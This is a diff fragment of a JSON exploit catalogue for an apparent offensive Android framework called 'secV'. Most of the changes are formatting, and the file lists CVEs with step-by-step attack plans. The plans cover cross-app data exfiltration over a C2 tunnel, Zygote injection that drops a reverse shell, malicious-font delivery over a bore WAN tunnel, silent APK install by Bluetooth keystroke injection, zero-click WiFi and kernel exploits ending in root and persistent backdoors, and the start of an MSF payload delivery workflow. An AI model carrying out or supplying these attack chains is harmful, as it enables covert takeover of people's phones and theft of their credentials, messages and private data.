           "description": "Flaw in createPackageContextAsUser() allows an installed app (no special permissions) to execute code in the context of another installed app. Enables cross-app data access without root.",
-          "attack_vector": "LOCAL — requires installed app",
+          "attack_vector": "LOCAL - requires installed app",
           "prerequisites": "Malicious APK installed",
           "secv_op": "exploit",
           "secv_check": "patch_date < 2024-03-01 AND api_level <= 34",
           "secv_integration": "Post-APK-install privilege escalation via P&D payload",
           "exploit": {
-            "technique": "createPackageContextAsUser() sandbox bypass — arbitrary cross-app data read without root",
+            "technique": "createPackageContextAsUser() sandbox bypass - arbitrary cross-app data read without root",
             "steps": [
               "1. Install secV payload APK on target device via any delivery method",
               "2. Call createPackageContextAsUser(targetPackage, flags, uid) to obtain target app context",
@@ -1174,7 +1256,10 @@
               "5. Exfiltrate via C2 channel (bore tunnel / HTTP POST)",
               "6. Chain with CVE-2024-31317 for full root escalation"
             ],
-            "tools": ["secV payload APK (embedded exploit)", "adb shell (verification)"],
+            "tools": [
+              "secV payload APK (embedded exploit)",
+              "adb shell (verification)"
+            ],
             "secv_function": "_exploit_cve_2024_0044",
             "outcome": "Full cross-app private data exfiltration without root; pivot to CVE-2024-31317 for uid=0",
             "constraints": "Requires installed APK; API 28-34 only; patch < 2024-03-01"
@@ -1185,7 +1270,15 @@
           "severity": "HIGH",
           "cvss": 8.8,
           "patch_date": "2024-06-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34],
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34
+          ],
           "title": "Android Zygote Privilege Escalation",
           "description": "Privilege escalation via Android Zygote process. Allows installed app to gain elevated privileges. Requires malicious APK.",
           "attack_vector": "LOCAL",
@@ -1196,11 +1289,15 @@
             "steps": [
               "1. Install APK with any permissions (none specific required for this path)",
               "2. Call ActivityManager.setProcessMemoryTrimLevel(processName, ...) where processName contains shell metacharacters",
-              "3. Zygote interprets process name as shell command — arbitrary code execution as UID=system (1000)",
+              "3. Zygote interprets process name as shell command - arbitrary code execution as UID=system (1000)",
               "4. Drop reverse shell or write persistence payload to /data/local/tmp/",
               "5. If device has Magisk: chain su call to reach uid=0"
             ],
-            "tools": ["secV payload APK", "adb shell setprop (trigger)", "github.com/search?q=CVE-2024-31317"],
+            "tools": [
+              "secV payload APK",
+              "adb shell setprop (trigger)",
+              "github.com/search?q=CVE-2024-31317"
+            ],
             "secv_function": "_exploit_cve_2024_31317",
             "outcome": "System-level code execution (uid=1000) via Zygote injection; root via Magisk chain",
             "constraints": "API 28-34; requires APK install or adb shell access; patch < 2024-06-01"
@@ -1211,7 +1308,14 @@
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2023-09-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
           "title": "Android Framework LaunchAnyWhere",
           "description": "Privilege escalation via improper access control in Android Framework. No additional permissions required.",
           "attack_vector": "LOCAL",
@@ -1226,7 +1330,10 @@
               "4. Launch: Settings > Developer Options enablement, Unknown Sources toggle, or ADB over WiFi pairing dialog",
               "5. Use launched system Activity to silently change security settings or install additional payloads"
             ],
-            "tools": ["secV payload APK", "adb am start (verification)"],
+            "tools": [
+              "secV payload APK",
+              "adb am start (verification)"
+            ],
             "secv_function": "_exploit_cve_2023_35674",
             "outcome": "Arbitrary system Activity launch → security settings manipulation without user awareness",
             "constraints": "API 28-33; requires installed APK; patch < 2023-09-01"
@@ -1237,15 +1344,23 @@
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2024-11-01",
-          "affected_api": [29, 30, 31, 32, 33, 34, 35],
-          "title": "Android Documents UI Path Traversal — actively exploited in-the-wild",
-          "description": "Path traversal vulnerability in Android Documents UI. Allows app to access files outside its sandbox. CISA added to KEV catalog — confirmed active exploitation.",
+          "affected_api": [
+            29,
+            30,
+            31,
+            32,
+            33,
+            34,
+            35
+          ],
+          "title": "Android Documents UI Path Traversal - actively exploited in-the-wild",
+          "description": "Path traversal vulnerability in Android Documents UI. Allows app to access files outside its sandbox. CISA added to KEV catalog - confirmed active exploitation.",
           "attack_vector": "LOCAL",
           "exploitation_status": "IN_THE_WILD",
           "secv_op": "exploit",
           "secv_check": "patch_date < 2024-11-01",
           "exploit": {
-            "technique": "Path traversal via crafted content:// URI in DocumentsUI — read arbitrary files outside app sandbox",
+            "technique": "Path traversal via crafted content:// URI in DocumentsUI - read arbitrary files outside app sandbox",
             "steps": [
               "1. Install payload APK or use adb shell to invoke DocumentsProvider intent",
               "2. Craft content://com.android.externalstorage.documents/document/primary:../../../data/data/ URI",
@@ -1254,9 +1369,12 @@
               "5. Read /data/data/<target>/databases/*.db, SharedPreferences/*.xml, files/credentials",
               "6. Exfiltrate: banking credentials, session tokens, chat history, private keys"
             ],
-            "tools": ["secV payload APK", "adb shell content query (verification)"],
+            "tools": [
+              "secV payload APK",
+              "adb shell content query (verification)"
+            ],
             "secv_function": "_exploit_cve_2024_43093",
-            "outcome": "Cross-app file exfiltration via path traversal — confirmed actively exploited by threat actors",
+            "outcome": "Cross-app file exfiltration via path traversal - confirmed actively exploited by threat actors",
             "constraints": "API 29-35; requires installed APK or adb shell; patch < 2024-11-01"
           }
         },
@@ -1265,24 +1383,35 @@
           "severity": "HIGH",
           "cvss": 8.8,
           "patch_date": "2023-03-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
           "title": "MediaCodec Use-After-Free RCE",
           "description": "Use-after-free in Android MediaCodec. Allows remote code execution via malicious media file. No user interaction beyond opening file.",
           "attack_vector": "NETWORK",
           "secv_op": "exploit",
           "exploit": {
-            "technique": "Use-after-free in MediaCodec decoder — RCE via malicious media file or stream",
+            "technique": "Use-after-free in MediaCodec decoder - RCE via malicious media file or stream",
             "steps": [
               "1. Craft malicious MP4/MKV container with specially formatted codec configuration box triggering UAF in MediaCodec",
               "2. Deliver via: MMS attachment, email link, messaging app preview, or web page embedding malicious media",
               "3. UAF triggered in mediaserver process (UID=media, isolated from main app context)",
               "4. Spray mediaserver heap: send repeated decoder init/teardown cycles to control freed codec object",
-              "5. Overwrite MediaCodec vtable pointer — redirect to shellcode",
+              "5. Overwrite MediaCodec vtable pointer - redirect to shellcode",
               "6. From mediaserver: pivot to higher privilege via Binder IPC to system_server"
             ],
-            "tools": ["ffmpeg (malicious MP4 craft)", "python3 (MKV header builder)", "secV WAN HTTP delivery"],
+            "tools": [
+              "ffmpeg (malicious MP4 craft)",
+              "python3 (MKV header builder)",
+              "secV WAN HTTP delivery"
+            ],
             "secv_function": "_exploit_cve_2023_21282",
-            "outcome": "RCE in mediaserver (UID=media) via media file — minimal user interaction (tap link/open file)",
+            "outcome": "RCE in mediaserver (UID=media) via media file - minimal user interaction (tap link/open file)",
             "constraints": "API 28-33; target must open or preview crafted media file; patch < 2023-03-01"
           }
         },
@@ -1291,48 +1420,68 @@
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2025-04-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34, 35],
-          "title": "FreeType OOB Write — actively exploited against Android",
-          "description": "Out-of-bounds write in FreeType font rendering library (libfreetype). Android bundles FreeType for font rendering — exploitable via malicious font file in web page, document, or app. Active exploitation confirmed by Google TAG in 2025.",
-          "attack_vector": "NETWORK — malicious web page/document",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34,
+            35
+          ],
+          "title": "FreeType OOB Write - actively exploited against Android",
+          "description": "Out-of-bounds write in FreeType font rendering library (libfreetype). Android bundles FreeType for font rendering - exploitable via malicious font file in web page, document, or app. Active exploitation confirmed by Google TAG in 2025.",
+          "attack_vector": "NETWORK - malicious web page/document",
           "exploitation_status": "IN_THE_WILD",
           "secv_op": "exploit",
           "delivery": "Malicious web page → Chrome/WebView → font parsing → RCE",
           "exploit": {
-            "technique": "OOB write in libfreetype font glyph parser — RCE via malicious web page served over WAN",
+            "technique": "OOB write in libfreetype font glyph parser - RCE via malicious web page served over WAN",
             "steps": [
               "1. Craft malicious OpenType/TTF font file with invalid glyph data triggering OOB write in FT_Load_Glyph()",
               "2. Embed font in HTML page via @font-face CSS rule",
               "3. Host on bore WAN tunnel: bore local --to bore.pub 8080",
               "4. Deliver link to target via any social engineering channel (SMS, WhatsApp, email)",
-              "5. Target visits page — Chrome/WebView loads font, triggers OOB write in renderer process (UID=nobody/isolated)",
-              "6. Spray renderer heap to control OOB destination — overwrite function pointer",
+              "5. Target visits page - Chrome/WebView loads font, triggers OOB write in renderer process (UID=nobody/isolated)",
+              "6. Spray renderer heap to control OOB destination - overwrite function pointer",
               "7. Escape renderer sandbox via Binder to achieve full app-level code execution"
             ],
-            "tools": ["fonttools / ttx (malicious font craft)", "python3 http.server + bore (WAN delivery)", "secV P&D tab (hosting)"],
+            "tools": [
+              "fonttools / ttx (malicious font craft)",
+              "python3 http.server + bore (WAN delivery)",
+              "secV P&D tab (hosting)"
+            ],
             "secv_function": "_exploit_cve_2025_27363",
-            "outcome": "RCE in Chrome/WebView renderer — confirmed actively exploited in-the-wild by Google TAG",
+            "outcome": "RCE in Chrome/WebView renderer - confirmed actively exploited in-the-wild by Google TAG",
             "constraints": "Any API level with libfreetype < 2.13.3; target must visit attacker URL; patch < 2025-04-01"
           }
         }
       ],
-
       "bluetooth": [
         {
           "cve": "CVE-2023-45866",
           "severity": "CRITICAL",
           "cvss": 9.0,
           "patch_date": "2023-12-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34],
-          "title": "Bluetooth HID Keyboard Injection — no pairing required",
-          "description": "Unauthenticated Bluetooth HID (Human Interface Device) injection. Attacker within Bluetooth range can inject keystrokes as if a keyboard is paired — no pairing, no confirmation required. Enables silent APK install, settings change, URL navigation.",
-          "attack_vector": "ADJACENT_NETWORK — Bluetooth range (~10m)",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34
+          ],
+          "title": "Bluetooth HID Keyboard Injection - no pairing required",
+          "description": "Unauthenticated Bluetooth HID (Human Interface Device) injection. Attacker within Bluetooth range can inject keystrokes as if a keyboard is paired - no pairing, no confirmation required. Enables silent APK install, settings change, URL navigation.",
+          "attack_vector": "ADJACENT_NETWORK - Bluetooth range (~10m)",
           "prerequisites": "Bluetooth enabled on target, attacker within range",
           "secv_op": "exploit",
           "secv_check": "patch_date < 2023-12-01 AND bluetooth_enabled",
-          "secv_integration": "bt_hid_inject op — type install URL + enable unknown sources",
+          "secv_integration": "bt_hid_inject op - type install URL + enable unknown sources",
           "exploit": {
-            "technique": "Rogue Bluetooth HID keyboard — inject keystrokes without pairing or confirmation",
+            "technique": "Rogue Bluetooth HID keyboard - inject keystrokes without pairing or confirmation",
             "steps": [
               "1. Position attacker device within Bluetooth range (~10m) of target",
               "2. Use btlejuice/PoC tool to present as HID keyboard without going through pairing ceremony (CVE-specific bypass of pairing enforcement)",
@@ -1340,9 +1489,13 @@
               "4. Alternative Android 11+ path: inject Wi-Fi ADB pairing code sequence via Settings > Developer Options",
               "5. Once APK installed or ADB paired, secV C2 connection established"
             ],
-            "tools": ["github.com/skysafe/reblog/tree/main/cve-2023-45866", "Linux btmgmt + hciconfig", "bluetoothctl"],
+            "tools": [
+              "github.com/skysafe/reblog/tree/main/cve-2023-45866",
+              "Linux btmgmt + hciconfig",
+              "bluetoothctl"
+            ],
             "secv_function": "_exploit_cve_2023_45866",
-            "outcome": "Silent APK install and persistence via Bluetooth proximity — no user interaction required",
+            "outcome": "Silent APK install and persistence via Bluetooth proximity - no user interaction required",
             "constraints": "Bluetooth must be enabled on target; attacker within ~10m; patch < 2023-12-01"
           }
         },
@@ -1351,26 +1504,37 @@
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2023-12-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34],
-          "title": "Android Bluetooth Use-After-Free — zero-click RCE",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34
+          ],
+          "title": "Android Bluetooth Use-After-Free - zero-click RCE",
           "description": "Use-after-free in Android Bluetooth stack (l2c_rcv_acl_data). Can lead to RCE with no user interaction when Bluetooth is enabled. Zero-click.",
-          "attack_vector": "ADJACENT_NETWORK — Bluetooth range",
+          "attack_vector": "ADJACENT_NETWORK - Bluetooth range",
           "prerequisites": "Bluetooth enabled",
           "secv_op": "exploit",
           "exploitation_status": "POC_AVAILABLE",
           "exploit": {
-            "technique": "Use-after-free in Bluetooth l2c_rcv_acl_data() — zero-click RCE via crafted ACL packet",
+            "technique": "Use-after-free in Bluetooth l2c_rcv_acl_data() - zero-click RCE via crafted ACL packet",
             "steps": [
               "1. Identify target device with Bluetooth enabled (discoverable or previously seen) via BT scan",
               "2. Establish or spoof ACL connection to target BD_ADDR",
               "3. Send crafted L2CAP ACL data packet triggering UAF in l2c_rcv_acl_data() during teardown race",
-              "4. Freed bt_conn struct reclaimed via Binder buffer spray — control vtable pointer",
+              "4. Freed bt_conn struct reclaimed via Binder buffer spray - control vtable pointer",
               "5. Execute shellcode in com.android.bluetooth process (UID=1002, bluetooth group)",
               "6. From bluetooth process: pivot to system_server via Binder IPC privilege chain"
             ],
-            "tools": ["scapy + BlueZ (craft ACL)", "custom PoC (no public release — research PoC only)"],
+            "tools": [
+              "scapy + BlueZ (craft ACL)",
+              "custom PoC (no public release - research PoC only)"
+            ],
             "secv_function": "_exploit_cve_2023_40088",
-            "outcome": "Zero-click RCE in Bluetooth process — no user interaction, only Bluetooth enabled",
+            "outcome": "Zero-click RCE in Bluetooth process - no user interaction, only Bluetooth enabled",
             "constraints": "Bluetooth must be enabled; attacker within Bluetooth range (~100m class 1); patch < 2023-12-01"
           }
         },
@@ -1379,43 +1543,58 @@
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2024-02-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34],
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34
+          ],
           "title": "Bluetooth Access Control Bypass",
           "description": "Missing permission check in Android Bluetooth subsystem allows bypass of access controls.",
           "attack_vector": "ADJACENT_NETWORK",
           "secv_op": "exploit",
           "exploit": {
-            "technique": "Missing BLUETOOTH_PRIVILEGED check in HFP profile handler — AT command execution without permission",
+            "technique": "Missing BLUETOOTH_PRIVILEGED check in HFP profile handler - AT command execution without permission",
             "steps": [
               "1. Establish Bluetooth connection with target (HFP hands-free profile)",
               "2. Send AT+BRSF (Bluetooth Retrieve Supported Features) without BLUETOOTH_PRIVILEGED permission",
-              "3. HFP handler processes command — missing permission check allows restricted profile operations",
+              "3. HFP handler processes command - missing permission check allows restricted profile operations",
               "4. Read phonebook contacts, initiate outgoing calls, or inject audio path manipulation",
               "5. Chain with proximity for further social engineering or data collection"
             ],
-            "tools": ["PyBluez", "bluetoothctl AT terminal", "rfcomm (raw BT serial)"],
+            "tools": [
+              "PyBluez",
+              "bluetoothctl AT terminal",
+              "rfcomm (raw BT serial)"
+            ],
             "secv_function": "_exploit_cve_2024_23717",
-            "outcome": "Bluetooth HFP access control bypass — phonebook read and call initiation without permissions",
+            "outcome": "Bluetooth HFP access control bypass - phonebook read and call initiation without permissions",
             "constraints": "Requires BT connection (pairing or HFP profile acceptance); API ≤33; patch < 2024-02-01"
           }
         }
       ],
-
       "samsung_specific": [
         {
           "cve": "CVE-2023-21492",
           "severity": "HIGH",
           "cvss": 7.5,
           "patch_date": "2023-05-01",
-          "affected_devices": ["Samsung Galaxy A series", "S series", "Note series"],
-          "title": "Samsung Kernel Log File — pointer leak",
+          "affected_devices": [
+            "Samsung Galaxy A series",
+            "S series",
+            "Note series"
+          ],
+          "title": "Samsung Kernel Log File - pointer leak",
           "description": "Samsung-specific kernel log file is world-readable. Contains kernel pointer addresses, defeating KASLR (Kernel Address Space Layout Randomization). Useful as info-leak primitive to enable follow-on kernel exploits.",
           "attack_vector": "LOCAL",
           "secv_op": "recon",
           "secv_check": "manufacturer == Samsung AND patch_date < 2023-05-01",
           "secv_integration": "recon op reads /proc/kmsg or logcat for pointer leaks",
           "exploit": {
-            "technique": "World-readable Samsung kernel log file — extract KASLR base address to enable reliable kernel ROP",
+            "technique": "World-readable Samsung kernel log file - extract KASLR base address to enable reliable kernel ROP",
             "steps": [
               "1. Confirm Samsung manufacturer and patch < 2023-05-01 via recon",
               "2. Read /proc/kmsg or Samsung-specific log path (e.g. /data/log/dumpstate/) without root",
@@ -1424,9 +1603,13 @@
               "5. Calculate KASLR slide: leaked_addr - compiled_symbol_offset",
               "6. Provide computed slide to kernel exploit payload (CVE-2023-0266 or CVE-2024-53104) for deterministic ROP"
             ],
-            "tools": ["adb shell (log read)", "python3 (address extraction + slide calc)", "secV recon op output"],
+            "tools": [
+              "adb shell (log read)",
+              "python3 (address extraction + slide calc)",
+              "secV recon op output"
+            ],
             "secv_function": "_exploit_cve_2023_21492",
-            "outcome": "KASLR defeated — kernel base address known; prerequisite for reliable kernel exploit chaining",
+            "outcome": "KASLR defeated - kernel base address known; prerequisite for reliable kernel exploit chaining",
             "constraints": "Samsung devices only; patch < 2023-05-01; low-privilege app or shell access sufficient"
           }
         },
@@ -1435,25 +1618,31 @@
           "severity": "HIGH",
           "cvss": 8.4,
           "patch_date": "2024-09-01",
-          "affected_devices": ["Samsung devices with SmartSwitch"],
+          "affected_devices": [
+            "Samsung devices with SmartSwitch"
+          ],
           "title": "Samsung SmartSwitch Arbitrary Code Execution",
           "description": "Arbitrary code execution via SmartSwitch backup/restore functionality. Malicious backup file triggers code execution during restore.",
           "attack_vector": "LOCAL",
           "secv_op": "exploit",
           "exploit": {
-            "technique": "Path traversal in SmartSwitch backup archive extraction — ACE in privileged Samsung system app context",
+            "technique": "Path traversal in SmartSwitch backup archive extraction - ACE in privileged Samsung system app context",
             "steps": [
               "1. Craft malicious SmartSwitch backup (.sbu) archive with Zip Slip path traversal entries",
               "2. Embed entries with filenames containing '../../../' pointing to SmartSwitch app private directory",
               "3. Include malicious .so library as one of the traversal-written files",
               "4. Deliver backup file to target (USB cable, ADB push, or cloud sync)",
-              "5. User triggers SmartSwitch restore — app extracts archive without sanitizing paths",
-              "6. Malicious .so written to SmartSwitch data dir — loaded on next SmartSwitch launch",
+              "5. User triggers SmartSwitch restore - app extracts archive without sanitizing paths",
+              "6. Malicious .so written to SmartSwitch data dir - loaded on next SmartSwitch launch",
               "7. Code executes in SmartSwitch context (Samsung system app with privileged permissions)"
             ],
-            "tools": ["python3 zipfile (craft .sbu)", "adb push (deliver)", "msfvenom (payload .so)"],
+            "tools": [
+              "python3 zipfile (craft .sbu)",
+              "adb push (deliver)",
+              "msfvenom (payload .so)"
+            ],
             "secv_function": "_exploit_cve_2024_34585",
-            "outcome": "ACE as privileged Samsung system app — access to device backup data, contacts, messages",
+            "outcome": "ACE as privileged Samsung system app - access to device backup data, contacts, messages",
             "constraints": "SmartSwitch must be installed; user must initiate restore; Samsung devices only; patch < 2024-09-01"
           }
         },
@@ -1462,61 +1651,82 @@
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2024-03-01",
-          "affected_devices": ["Samsung devices with Exynos WiFi chipset (WLAN driver)"],
-          "title": "Samsung Exynos WLAN OOB Write — zero-click WiFi RCE",
-          "description": "Out-of-bounds write in Samsung Exynos WiFi driver (wl18xx/dhd). No user interaction required — attacker on same WiFi network or within WiFi range can trigger RCE. Affects Exynos devices with Broadcom/Samsung WiFi chipsets.",
-          "attack_vector": "ADJACENT_NETWORK — WiFi",
+          "affected_devices": [
+            "Samsung devices with Exynos WiFi chipset (WLAN driver)"
+          ],
+          "title": "Samsung Exynos WLAN OOB Write - zero-click WiFi RCE",
+          "description": "Out-of-bounds write in Samsung Exynos WiFi driver (wl18xx/dhd). No user interaction required - attacker on same WiFi network or within WiFi range can trigger RCE. Affects Exynos devices with Broadcom/Samsung WiFi chipsets.",
+          "attack_vector": "ADJACENT_NETWORK - WiFi",
           "prerequisites": "Same WiFi network or WiFi probe frame range",
           "secv_op": "exploit",
           "exploitation_status": "POC_AVAILABLE",
           "secv_check": "manufacturer == Samsung AND patch_date < 2024-03-01",
           "exploit": {
-            "technique": "OOB write in Samsung Exynos WLAN kernel driver (dhd.ko) — zero-click kernel RCE via WiFi management frame",
+            "technique": "OOB write in Samsung Exynos WLAN kernel driver (dhd.ko) - zero-click kernel RCE via WiFi management frame",
             "steps": [
               "1. Confirm target is on same WiFi network or within WiFi probe response range",
               "2. Send crafted 802.11 Probe Response or Beacon frame with malformed Information Element (IE) field",
-              "3. Exynos dhd.ko WiFi driver processes IE without proper bounds check — OOB write in kernel memory",
-              "4. No user interaction required — driver processes management frames automatically",
+              "3. Exynos dhd.ko WiFi driver processes IE without proper bounds check - OOB write in kernel memory",
+              "4. No user interaction required - driver processes management frames automatically",
               "5. Spray kernel heap via repeated crafted frames to control OOB destination",
-              "6. Overwrite kernel cred struct or function pointer — achieve ring-0 execution",
+              "6. Overwrite kernel cred struct or function pointer - achieve ring-0 execution",
               "7. Install persistent kernel backdoor or drop elevated shell"
             ],
-            "tools": ["scapy (802.11 craft)", "hostapd (rogue AP mode)", "SSD Advisories PoC (reference implementation)"],
+            "tools": [
+              "scapy (802.11 craft)",
+              "hostapd (rogue AP mode)",
+              "SSD Advisories PoC (reference implementation)"
+            ],
             "secv_function": "_exploit_cve_2024_20017",
-            "outcome": "Zero-click kernel RCE over WiFi — no user interaction; persistent root",
+            "outcome": "Zero-click kernel RCE over WiFi - no user interaction; persistent root",
             "constraints": "Samsung devices with Exynos WiFi chipset (dhd driver); attacker on same network or WiFi frame range; patch < 2024-03-01"
           }
         }
       ],
-
       "kernel_lpe": [
         {
           "cve": "CVE-2023-0266",
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2023-03-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
-          "title": "Linux Kernel ALSA Use-After-Free — LPE",
-          "description": "Use-after-free in Linux kernel ALSA sound subsystem (snd_ctl_elem_read). Local privilege escalation to root. Affects Android kernels 4.4-5.10 — Samsung A30 runs kernel 4.4.177.",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
+          "title": "Linux Kernel ALSA Use-After-Free - LPE",
+          "description": "Use-after-free in Linux kernel ALSA sound subsystem (snd_ctl_elem_read). Local privilege escalation to root. Affects Android kernels 4.4-5.10 - Samsung A30 runs kernel 4.4.177.",
           "attack_vector": "LOCAL",
-          "kernel_versions": ["4.4.x", "4.9.x", "4.14.x", "5.10.x"],
+          "kernel_versions": [
+            "4.4.x",
+            "4.9.x",
+            "4.14.x",
+            "5.10.x"
+          ],
           "secv_op": "exploit",
           "secv_check": "kernel_version contains 4.4 AND patch_date < 2023-03-01",
-          "secv_integration": "get_root op — kernel LPE fallback if Magisk not present",
+          "secv_integration": "get_root op - kernel LPE fallback if Magisk not present",
           "exploit": {
-            "technique": "Use-after-free in ALSA snd_ctl_elem_read() — race condition LPE to uid=0",
+            "technique": "Use-after-free in ALSA snd_ctl_elem_read() - race condition LPE to uid=0",
             "steps": [
               "1. Confirm kernel version 4.4-5.10 and patch < 2023-03-01 via recon",
               "2. Push exploit binary to /data/local/tmp/ via adb or installed APK",
               "3. Open /dev/snd/controlC0 from two threads; trigger race: free snd_ctl_elem in thread A while thread B holds reference in snd_ctl_elem_read()",
-              "4. Freed snd_ctl_elem reclaimed via /dev/kmem pipe spray or userfaultfd — fill with ROP chain",
-              "5. snd_ctl_elem_read() dereferences freed object — executes attacker ROP chain in kernel context",
-              "6. ROP chain: overwrite current->cred uid/gid fields to 0 — return to userspace as root",
+              "4. Freed snd_ctl_elem reclaimed via /dev/kmem pipe spray or userfaultfd - fill with ROP chain",
+              "5. snd_ctl_elem_read() dereferences freed object - executes attacker ROP chain in kernel context",
+              "6. ROP chain: overwrite current->cred uid/gid fields to 0 - return to userspace as root",
               "7. Spawn root shell or write su binary"
             ],
-            "tools": ["exploit binary (compiled for arm64)", "adb push / APK loader", "github.com/search?q=CVE-2023-0266"],
+            "tools": [
+              "exploit binary (compiled for arm64)",
+              "adb push / APK loader",
+              "github.com/search?q=CVE-2023-0266"
+            ],
             "secv_function": "_exploit_cve_2023_0266",
-            "outcome": "Kernel LPE to uid=0 root — effective on kernel 4.4.x through 5.10.x; bypasses SELinux via context rewrite",
+            "outcome": "Kernel LPE to uid=0 root - effective on kernel 4.4.x through 5.10.x; bypasses SELinux via context rewrite",
             "constraints": "Kernel 4.4.x-5.10.x; patch < 2023-03-01; any app-level code execution required"
           }
         },
@@ -1525,26 +1735,37 @@
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2023-07-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
-          "title": "Linux Kernel StackRot — VMA linked list corruption LPE",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
+          "title": "Linux Kernel StackRot - VMA linked list corruption LPE",
           "description": "Vulnerability in Linux kernel memory management (mm/maple_tree.c). Stack-based privilege escalation to root. Named StackRot.",
           "attack_vector": "LOCAL",
           "secv_op": "exploit",
           "secv_integration": "get_root op chain",
           "exploit": {
-            "technique": "Maple tree node rotation race condition — VMA UAF leading to controlled kernel write",
+            "technique": "Maple tree node rotation race condition - VMA UAF leading to controlled kernel write",
             "steps": [
               "1. Confirm kernel 6.1-6.3 via recon (uname -r)",
               "2. Push StackRot exploit binary to /data/local/tmp/",
               "3. Trigger mmap()/munmap() sequence to force maple tree B-tree rotation in kernel VMA manager",
               "4. Race: node rotation frees old maple tree node while another thread holds stale pointer",
               "5. Reclaim freed maple_node with controlled userland data (userfaultfd / FUSE stall trick)",
-              "6. VMA traversal dereferences attacker-controlled maple_node — arbitrary kernel write primitive",
-              "7. Overwrite kernel cred structure — escalate to uid=0"
+              "6. VMA traversal dereferences attacker-controlled maple_node - arbitrary kernel write primitive",
+              "7. Overwrite kernel cred structure - escalate to uid=0"
             ],
-            "tools": ["github.com/lrh2000/StackRot (PoC)", "exploit binary (arm64)", "adb push"],
+            "tools": [
+              "github.com/lrh2000/StackRot (PoC)",
+              "exploit binary (arm64)",
+              "adb push"
+            ],
             "secv_function": "_exploit_cve_2023_3269",
-            "outcome": "Kernel LPE to root via VMA maple tree UAF — affects kernel 6.1-6.3",
+            "outcome": "Kernel LPE to root via VMA maple tree UAF - affects kernel 6.1-6.3",
             "constraints": "Kernel 6.1.x-6.3.x only (maple tree VMA); requires local code execution"
           }
         },
@@ -1553,34 +1774,46 @@
           "severity": "HIGH",
           "cvss": 7.8,
           "patch_date": "2025-02-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34, 35],
-          "title": "Linux Kernel USB Video Class OOB Write — LPE, actively exploited",
-          "description": "Out-of-bounds write in Linux kernel USB video class (UVC) driver. Exploitable via malicious USB device or crafted UVC packets. CISA KEV — confirmed active exploitation against Android.",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34,
+            35
+          ],
+          "title": "Linux Kernel USB Video Class OOB Write - LPE, actively exploited",
+          "description": "Out-of-bounds write in Linux kernel USB video class (UVC) driver. Exploitable via malicious USB device or crafted UVC packets. CISA KEV - confirmed active exploitation against Android.",
           "attack_vector": "LOCAL (USB) or crafted UVC frame",
           "exploitation_status": "IN_THE_WILD",
           "secv_op": "exploit",
           "secv_check": "patch_date < 2025-02-01",
           "exploit": {
-            "technique": "OOB write in Linux kernel UVC driver (uvc_parse_streaming) — LPE via malicious USB or crafted UVC frame",
+            "technique": "OOB write in Linux kernel UVC driver (uvc_parse_streaming) - LPE via malicious USB or crafted UVC frame",
             "steps": [
               "1. Confirm patch < 2025-02-01 via recon",
               "2. Deliver exploit via: (a) malicious USB video device plugged in, OR (b) crafted UVC frame injection via kernel socket",
-              "3. uvc_parse_streaming() parses UVC descriptor — skips UVC_VS_UNDEFINED frames but miscalculates buffer index for subsequent frames",
-              "4. OOB write beyond allocated streaming interface array — corrupts adjacent kernel object",
+              "3. uvc_parse_streaming() parses UVC descriptor - skips UVC_VS_UNDEFINED frames but miscalculates buffer index for subsequent frames",
+              "4. OOB write beyond allocated streaming interface array - corrupts adjacent kernel object",
               "5. Spray kernel heap to land attacker data at corruption target (pipe_buffer / msg_msg spray)",
-              "6. Achieve arbitrary kernel write — overwrite cred struct uid fields",
+              "6. Achieve arbitrary kernel write - overwrite cred struct uid fields",
               "7. Root shell spawned; confirmed actively weaponized by threat actors in-the-wild"
             ],
-            "tools": ["USB gadget device (physical attack)", "custom UVC frame injector", "github.com/search?q=CVE-2024-53104"],
+            "tools": [
+              "USB gadget device (physical attack)",
+              "custom UVC frame injector",
+              "github.com/search?q=CVE-2024-53104"
+            ],
             "secv_function": "_exploit_cve_2024_53104",
-            "outcome": "Kernel LPE to root via UVC driver OOB — confirmed active exploitation in-the-wild; any API level",
+            "outcome": "Kernel LPE to root via UVC driver OOB - confirmed active exploitation in-the-wild; any API level",
             "constraints": "Physical USB access for hardware path; any API level; patch < 2025-02-01"
           }
         }
       ],
-
       "recon_chain": {
-        "description": "secV recon op CVE applicability check sequence. Run automatically on recon — surfaces HIGH/CRITICAL applicable CVEs in findings.",
+        "description": "secV recon op CVE applicability check sequence. Run automatically on recon - surfaces HIGH/CRITICAL applicable CVEs in findings.",
         "steps": [
           "1. Read ro.build.version.security_patch → parse as YYYY-MM-DD",
           "2. Read ro.product.cpu.abi → detect arm64 / x86",
@@ -1595,7 +1828,6 @@
         ]
       }
     },
-
     "wan_delivery_workflow": {
       "description": "End-to-end guide for standalone APK payload delivery over WAN (mobile internet / remote target). No USB cable required. Uses bore tunnels for both the MSF callback and APK HTTP delivery.",
       "prerequisites": [
